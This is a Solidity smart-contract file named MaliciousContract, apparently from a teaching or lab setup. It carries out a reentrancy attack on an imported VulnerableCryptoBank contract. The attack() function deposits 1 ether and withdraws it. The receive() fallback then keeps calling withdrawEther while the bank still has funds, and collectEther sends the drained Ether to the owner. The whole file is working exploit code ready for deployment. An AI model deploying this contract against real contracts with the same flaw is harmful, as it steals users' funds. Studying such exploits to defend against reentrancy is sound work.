// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableCryptoBank.sol";

contract MaliciousContract {
    VulnerableCryptoBank public vulnerableBank;
    address public owner;
    uint256 public attackAmount = 1 ether;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableCryptoBank(_vulnerableBank);
        owner = msg.sender;
    }

    // Fallback to be executed when receiving Ether
    receive() external payable {
        // While the victim contract has funds, we'll keep withdrawing
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdrawEther(attackAmount);
        }
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ether");

        // Deposits Ether's in the victim contract
        vulnerableBank.depositEther{value: attackAmount}();

        // Starts the attack
        vulnerableBank.withdrawEther(attackAmount);
    }

    // Allows the attacker to collect the Ether from this contract
    function collectEther() external {
        require(msg.sender == owner, "Only owner can collect");
        payable(owner).transfer(address(this).balance);
    }
}
